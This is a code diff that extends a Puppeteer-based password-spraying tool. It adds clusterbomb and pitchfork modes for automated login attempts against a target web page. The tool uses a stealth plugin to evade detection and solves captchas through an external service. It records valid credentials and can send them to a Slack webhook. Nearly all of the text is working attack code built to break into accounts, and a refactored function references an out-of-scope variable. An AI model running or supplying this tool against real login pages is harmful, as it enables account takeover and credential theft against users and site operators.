@@ -16,6 +16,11 @@ program
     .description("A generic DOM-based password sprayer")
     .version("2.1.0")
     .option("-t, --target <url>", "Target URL")
+    .option(
+        "-m, --mode <mode>",
+        "Mode of operation (clusterbomb|pitchfork)",
+        "clusterbomb"
+    )
     .option("-uf, --username-field <selector>", "Username field selector")
     .option("-pf, --password-field <selector>", "Password field selector")
     .option("-lf, --login-button <selector>", "Login button selector")
@@ -119,6 +124,12 @@ if (
     process.exit(1);
 }
 
+// Verify mode of operation
+if (options.mode !== "clusterbomb" && options.mode !== "pitchfork") {
+    console.error(chalk.red("Invalid mode of operation!"));
+    process.exit(1);
+}
+
 async function waitForDelayAndSelector(page, delay, selector) {
     if (delay) {
         await sleep(delay);
@@ -178,6 +189,206 @@ async function solveCaptcha(page, options) {
     }
 }
 
+async function process_result(isLoginSuccessful, username, password, options) {
+    if (isLoginSuccessful) {
+        fs.appendFileSync(options.output, `${username}:${password}\n`);
+
+        // Log to stdout
+        if (options.demo) {
+            const msg = `[+] Found valid credentials -> ${username}:**********`;
+            console.log(chalk.green(msg));
+        } else {
+            const msg = `[+] Found valid credentials -> ${username}:${password}`;
+            console.log(chalk.green(msg));
+        }
+
+        // Take screenshot if option is enabled
+        if (options.screenshot) {
+            const encodedCred = Buffer.from(`${username}:${password}`).toString(
+                "base64url"
+            );
+            const scr_path = path.join(
+                options.directory,
+                `success_${encodedCred}.png`
+            );
+            try {
+                await page.screenshot({
+                    path: scr_path,
+                    fullPage: true,
+                });
+                console.log(chalk.blue("Screenshot saved to ", scr_path));
+            } catch {
+                console.error(
+                    chalk.red("Could not save screenshot to ", scr_path)
+                );
+            }
+        }
+
+        // Send Slack webhook with username and password
+        if (options.slackWebhook) {
+            // In case of error, it will just log a message
+            await sendSlackWebhook(options.slackWebhook, username, password);
+        }
+    }
+}
+
+async function login(browser, username, password, options) {
+    const page = (await browser.pages())[0];
+    let isLoginSuccessful = false;
+    try {
+        // Initialize object to control usage of anti-captcha service
+        const statsSvc = {
+            used: false,
+            id: "",
+            text: "",
+            success: false,
+        };
+
+        if (options.mode === "pitchfork") {
+            if (options.demo) {
+                console.log(`Current credentials: ${username}:**************`);
+            } else {
+                console.log(`Current credentials: ${username}:${password}`);
+            }
+        } else {
+            console.log(`Current username: ${username}`);
+        }
+
+        await page.goto(options.target);
+
+        const usernameSelector = await page.waitForSelector(
+            options["usernameField"],
+            { visible: true }
+        );
+
+        if (!usernameSelector) {
+            throw new Error(
+                `Username selector ${options["usernameField"]} not found`
+            );
+        }
+
+        // Type into username box
+        await usernameSelector.type(username, {
+            delay: options.typingDelay,
+        });
+
+        // Move to the password field - edit if needed
+        await page.keyboard.press("Tab");
+
+        // Search and type into password box
+        const passwordSelector = await page.waitForSelector(
+            options["passwordField"],
+            { visible: true }
+        );
+
+        if (!passwordSelector) {
+            throw new Error(
+                `Password selector ${options["passwordField"]} not found`
+            );
+        }
+
+        await passwordSelector.type(password, {
+            delay: options.typingDelay,
+        });
+
+        if (options.captchaBefore) {
+            // Solve captcha before clicking the login button
+            await solveCaptcha(page, options);
+        }
+
+        // Click on login button
+        const loginButtonSelector = await page.waitForSelector(
+            options["loginButton"],
+            { visible: true }
+        );
+        if (!loginButtonSelector) {
+            throw new Error(
+                `Login button selector ${options["loginButton"]} not found`
+            );
+        }
+
+        await loginButtonSelector.click();
+
+        // Adjust concurrency and idle time as needed
+        await page.waitForNetworkIdle({
+            concurrency: 0,
+            idleTime: options.waitTime,
+        });
+
+        // const [response] = await Promise.all([
+        //     page.waitForNavigation(), // The promise resolves after navigation has finished
+        //     loginButtonSelector.click(), // Clicking the button will indirectly cause a navigation
+        // ]);
+
+        // if (response === null) {
+        //     throw new Error("Navigation failed");
+        // }
+
+        if (options.captchaAfter) {
+            // Solve captcha after clicking the login button
+            await solveCaptcha(page, options);
+        }
+
+        // Check if login was successful
+        isLoginSuccessful = await checkLoginSuccess(page, options);
+        await process_result(isLoginSuccessful, username, password, options);
+    } catch (error) {
+        fs.appendFileSync("incomplete_reqs.txt", `${username}:${password}\n`);
+        console.error(chalk.red(`An error occurred: ${error}`));
+    } finally {
+        // clear browsing data
+        const client = await page.target().createCDPSession();
+        await client.send("Network.clearBrowserCookies");
+        await client.send("Network.clearBrowserCache");
+    }
+    return isLoginSuccessful;
+}
+
+async function clusterbomb(browser, usernames, passwords, options) {
+    for (const password of passwords) {
+        if (password === null || password === "") {
+            continue;
+        }
+        if (options.demo) {
+            console.log("[+] Spraying password **************");
+        } else {
+            console.log("[+] Spraying password ", password);
+        }
+        for (const username of usernames) {
+            if (username === null || username === "") {
+                continue;
+            }
+            const isLoginSuccessful = await login(
+                browser,
+                username,
+                password,
+                options
+            );
+            if (isLoginSuccessful) {
+                await removeFromArray(usernames, username);
+            }
+            await sleep(options.interval);
+        }
+    }
+}
+
+async function pitchfork(browser, usernames, passwords, options) {
+    let length = Math.min(usernames.length, passwords.length);
+    for (let i = 0; i < length; i++) {
+        const username = usernames[i];
+        const password = passwords[i];
+        if (password === null || password === "") {
+            continue;
+        }
+
+        if (username === null || username === "") {
+            continue;
+        }
+        await login(browser, username, password, options);
+        await sleep(options.interval);
+    }
+}
+
 // main code
 (async () => {
     // Load the stealth plugin
@@ -225,172 +436,12 @@ async function solveCaptcha(page, options) {
                 .readFileSync(options.passwords, "utf8")
                 .split("\n");
 
-            for (const password of passwords) {
-                if (password === null || password === "") {
-                    continue;
-                }
-                if (options.demo) {
-                    console.log("[+] Spraying password **************");
-                } else {
-                    console.log("[+] Spraying password ", password);
-                }
-                for (const username of usernames) {
-                    if (username === null || username === "") {
-                        continue;
-                    }
-
-                    const page = (await browser.pages())[0];
-                    try {
-                        // Initialize object to control usage of anti-captcha service
-                        const statsSvc = {
-                            used: false,
-                            id: "",
-                            text: "",
-                            success: false,
-                        };
-
-                        console.log(`Current username: ${username}`);
-
-                        await page.goto(options.target);
-
-                        const usernameSelector = await page.waitForSelector(
-                            options["usernameField"],
-                            { visible: true }
-                        );
-
-                        if (!usernameSelector) {
-                            throw new Error(`Username selector ${options["usernameField"]} not found`);
-                        }
-
-                        // Type into username box
-                        await usernameSelector.type(username, {
-                            delay: options.typingDelay,
-                        });
-
-                        // Move to the password field - edit if needed
-                        await page.keyboard.press("Tab");
-
-                        // Search and type into password box
-                        const passwordSelector = await page.waitForSelector(
-                            options["passwordField"],
-                            { visible: true }
-                        );
-
-                        if (!passwordSelector) {
-                            throw new Error(`Password selector ${options["passwordField"]} not found`);
-                        }
-
-                        await passwordSelector.type(password, {
-                            delay: options.typingDelay,
-                        });
-
-                        if (options.captchaBefore) {
-                            // Solve captcha before clicking the login button
-                            await solveCaptcha(page, options);
-                        }
-
-                        // Click on login button
-                        const loginButtonSelector = await page.waitForSelector(
-                            options["loginButton"],
-                            { visible: true }
-                        );
-                        if (!loginButtonSelector) {
-                            throw new Error(`Login button selector ${options["loginButton"]} not found`);
-                        }
-
-                        await loginButtonSelector.click();
-                        await page.waitForNetworkIdle();
-
-                        // const [response] = await Promise.all([
-                        //     page.waitForNavigation(), // The promise resolves after navigation has finished
-                        //     loginButtonSelector.click(), // Clicking the button will indirectly cause a navigation
-                        // ]);
-
-                        // if (response === null) {
-                        //     throw new Error("Navigation failed");
-                        // }
-
-                        if (options.captchaAfter) {
-                            // Solve captcha after clicking the login button
-                            await solveCaptcha(page, options);
-                        }
-
-                        // Check if login was successful
-                        const isLoginSuccessful = await checkLoginSuccess(
-                            page,
-                            options
-                        );
-                        if (isLoginSuccessful) {
-                            fs.appendFileSync(
-                                options.output,
-                                `${username}:${password}\n`
-                            );
-
-                            await removeFromArray(usernames, username);
-
-                            // Log to stdout
-                            if (options.demo) {
-                                const msg = `[+] Found valid credentials -> ${username}:**********`;
-                                console.log(chalk.green(msg));
-                            } else {
-                                const msg = `[+] Found valid credentials -> ${username}:${password}`;
-                                console.log(chalk.green(msg));
-                            }
-
-                            // Take screenshot if option is enabled
-                            if (options.screenshot) {
-                                const encodedCred = Buffer.from(
-                                    `${username}:${password}`
-                                ).toString("base64url");
-                                const scr_path = path.join(
-                                    options.directory,
-                                    `success_${encodedCred}.png`
-                                );
-                                try {
-                                    await page.screenshot({
-                                        path: scr_path,
-                                        fullPage: true,
-                                    });
-                                    console.log(
-                                        chalk.blue(
-                                            "Screenshot saved to ",
-                                            scr_path
-                                        )
-                                    );
-                                } catch {
-                                    console.error(
-                                        chalk.red(
-                                            "Could not save screenshot to ",
-                                            scr_path
-                                        )
-                                    );
-                                }
-                            }
-
-                            // Send Slack webhook with username and password
-                            if (options.slackWebhook) {
-                                // In case of error, it will just log a message
-                                await sendSlackWebhook(
-                                    options.slackWebhook,
-                                    username,
-                                    password
-                                );
-                            }
-                        }
-                    } catch (error) {
-                        fs.appendFileSync(
-                            "incomplete_reqs.txt",
-                            `${username}:${password}\n`
-                        );
-                        console.error(chalk.red(`An error occurred: ${error}`));
-                    } finally {
-                        // clear browsing data
-                        const client = await page.target().createCDPSession();
-                        await client.send("Network.clearBrowserCookies");
-                        await client.send("Network.clearBrowserCache");
-                        await sleep(options.interval);
-                    }
-                }
+            // clusterbomb mode
+            if (options.mode === "clusterbomb") {
+                await clusterbomb(browser, usernames, passwords, options);
+            } else {
+                // pitchfork mode
+                await pitchfork(browser, usernames, passwords, options);
             }
         } catch (error) {
             console.error(chalk.red(`An error occurred: ${error}`));
